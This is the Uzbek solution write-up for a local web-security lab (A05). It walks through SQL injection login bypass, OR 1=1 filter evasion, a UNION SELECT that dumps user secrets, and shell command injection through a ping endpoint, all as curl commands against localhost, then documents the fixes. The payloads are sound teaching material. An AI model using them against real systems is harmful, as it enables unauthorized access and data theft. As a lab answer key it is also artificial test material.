🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A05 — Yechim (spoylerlar!)

Avval [README](./README.uz.md) dagi maslahatlardan foydalanib, laboratoriyani oʻzingiz bajarib koʻring.

Quyidagi barcha soʻrovlar vulnerable ga tegishli (port 8041). Brauzerda yuklamalar xuddi shu maydonlarga qoʻyiladi — sayt va `/ui` bir xil natijani koʻrsatadi.

## 1. Kirishni aylanib oʻtish

Ilovada soʻrov quyidagicha yigʻiladi:

```sql
SELECT username, role, secret FROM users WHERE username = '<login>' AND password = '<parol>'
```

Loginga `admin'--` qoʻyilsa, `--` dan keyingi hamma narsa izohga aylanadi va parol tekshiruvi yoʻqoladi:

```sql
... WHERE username = 'admin'--' AND password = 'x'
```

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
# → admin sifatida kirish va FLAG{a05_sqli_login_bypass}
```

Admin sifatida kirganingizda `GET /me` ham shu flagni qaytaradi (brauzerda `/admin` ni oching).

Boshqa variant: login `nobody' OR '1'='1' --`, shart doim rost boʻlib qoladi va kirish jadvaldagi birinchi foydalanuvchidan bajariladi.

## 2. Yashirin charter reys

Qidiruv soʻrovida `AND hidden = 0` bor. Tirnoq bilan `OR 1=1` shartni doim rost qiladi, `--` esa qolganini tashlab yuboradi:

```bash
curl -G http://127.0.0.1:8041/flights \
  --data-urlencode "from=" --data-urlencode "to=%' OR 1=1 --"
# → oddiy reyslar orasida «SK 900» — charter paydo boʻladi
```

Uni oching: `GET /flight/6` — «Izoh» maydonida `FLAG{a05_hidden_flight}` turibdi.

`to='` ni davomisiz sinab koʻring: sahifa SQL xatosi matnini qaytaradi (`unrecognized token`). Bunday xatolar hujumchiga soʻrov tuzilishini tushunishga yordam beradi, shuning uchun ularni foydalanuvchiga koʻrsatib boʻlmaydi. Yana bir misol: `max_price=abc` → `no such column: abc`.

## 3. UNION: boshqa jadvaldan maʼlumotlar

Qidiruv 7 ustun qaytaradi (`id, flight_no, origin, destination, dep_date, dep_time, price`), demak `UNION SELECT` ham aynan 7 ta qaytarishi kerak:

```bash
curl -G http://127.0.0.1:8041/flights --data-urlencode "from=" \
  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
# → flight_no da foydalanuvchi nomi, destination da sir:
#   admin -> FLAG{a05_sqli_union_dump}
```

Brauzerda soxta «reyslar» xuddi shu roʻyxatda koʻrinadi: `admin → FLAG{...}`.

## 4. Tugun tekshiruvidagi command injection

Avval admin sessiyasini oling (1-bosqich), soʻng shell ajratuvchisi bilan host yuboring:

```bash
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8041/admin/check
# → {"output":"FLAG{a05_command_injection}\n"}
```

Ilova `ping -c 1 <host>` ni `os.popen`, ya'ni shell orqali bajaradi, shuning uchun `;` ikkinchi buyruqni ishga tushiradi — flag esa jarayon muhitida (`A05_FLAG`) turadi va uni shell koʻradi. Windows da ajratuvchi `&`, oʻzgaruvchi esa `%A05_FLAG%` koʻrinishida. Brauzerda: `/admin` → «Aeroport tuguni tekshiruvi» → host `localhost; echo $A05_FLAG`.

## Tuzatishlar (fixed, port 8042)

| Muammo | Tuzatish |
|--------|----------|
| SQL da qatorlarni yopishtirish (kirish, qidiruv) | Parametrlangan soʻrovlar: `... WHERE username = ?`, `origin LIKE ?`; qiymatlar uzunlik va format boʻyicha cheklangan |
| `hidden = 0` `OR 1=1` bilan zararsizlanadi | Shart va qiymatlar soʻrovning turli qismlarida — maʼlumot tuzilishni oʻzgartira olmaydi |
| Javobda BD xatosi matni | SQL xatosi endi yuzaga kelmaydi, koʻrsatilgan xabar umumiy boʻladi |
| Foydalanuvchi kiritganidan buyruq satri | Shell umuman yoʻq: host `^[A-Za-z0-9.-]+$` ga mos boʻlishi kerak va `socket.gethostbyname` orqali aniqlanadi |
| Jarayon muhitidagi flag | Tuzatilgan versiya sirni muhitga qoʻymaydi |

fixed da tekshirish (port 8042):

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login        # 401
curl -G http://127.0.0.1:8042/flights --data-urlencode "from=" \
  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
# → 0 ta qator: yuklama oddiy sifatida qidiriladi
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"Adm1n-lab-pass"}' http://127.0.0.1:8042/login
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8042/admin/check
# → invalid host: 'localhost; echo $A05_FLAG' (allowed: letters, digits, dot, dash)
```

## Yana nimani esda tutish kerak
- Parametrlash qiymatlarni himoya qiladi, lekin jadval va ustun nomlarini emas: ularni kiritishdan qoʻyib boʻlmaydi, faqat oq roʻyxatdan.
- Inyeksiyalar faqat SQL da emas: OT buyruqlari, LDAP, NoSQL-soʻrovlar, log yozuvlari. Tamoyil hamma joyda bitta: maʼlumotni kod bilan aralashtirib boʻlmaydi.
- Kiritishni tekshirish — qora roʻyxat emas, oq roʻyxat: «nuqtali vergul yoʻq» degan qoida `$IFS`, qator oʻzgarishi va boshqa oʻnlab hiylalarga yutqazadi.
- Kirish aylanib oʻtishi shundaki, parol SQL *ichida* tekshirilgan. Sirlarni ilova kodida solishtiring (saqlash haqida A04 laboratoriyasiga qarang).
